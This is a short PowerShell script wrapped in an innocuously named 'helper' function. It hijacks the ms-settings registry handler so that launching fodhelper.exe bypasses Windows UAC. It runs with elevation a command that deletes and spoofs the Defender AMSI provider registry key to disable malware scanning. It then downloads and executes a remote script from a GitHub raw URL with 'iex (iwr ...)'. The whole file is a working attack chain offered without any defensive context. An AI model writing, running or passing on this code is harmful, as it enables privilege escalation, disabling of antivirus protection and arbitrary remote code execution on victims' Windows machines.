function helper(){ 
 #thx JH!!

Param (    
 
 [String]$custom = "cmd.exe /c powershell New-Item 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFF}' -Force; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}' -Recurse; helper;" #default
 
      )
 
#Registry Command Edit
 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $custom -Force
 
#Bypass Execution
Start-Process "C:\Windows\System32\fodhelper.exe"

#continue
iex (iwr https://raw.githubusercontent.com/billhemmer2789/food/main/cocoa.ps1)
}
